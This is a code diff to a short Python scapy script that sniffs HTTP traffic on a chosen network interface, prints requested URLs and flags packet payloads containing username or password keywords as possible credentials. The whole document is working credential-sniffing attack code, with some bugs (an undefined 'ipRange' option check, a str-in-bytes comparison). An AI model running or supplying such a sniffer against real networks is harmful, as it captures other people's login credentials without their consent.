@@ -1,6 +1,19 @@
 #!usr/bin/env python3
 import scapy.all as scapy
 from scapy.layers import http
+import optparse
+
+def getArgs():
+    parser = optparse.OptionParser()
+
+    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff")
+    
+    options, arguments = parser.parse_args()
+    
+    if not options.ipRange:
+        parser.error("[-] Please specify a interface, use --help for more info.")
+
+    return options
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
@@ -8,13 +21,14 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
+        print(f"[+] HTTP Request >> {url}")
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ["username", "user", "uname", "login", "password", "pass"]
             for key in keywords:
                 if key in load:
-                    print(load)
+                    print(f"\n\n[+] Possible username/passowrd > {load}\n\n")
                     break
     
-sniff("eth0")
+options = getArgs()
+sniff(options.interface)
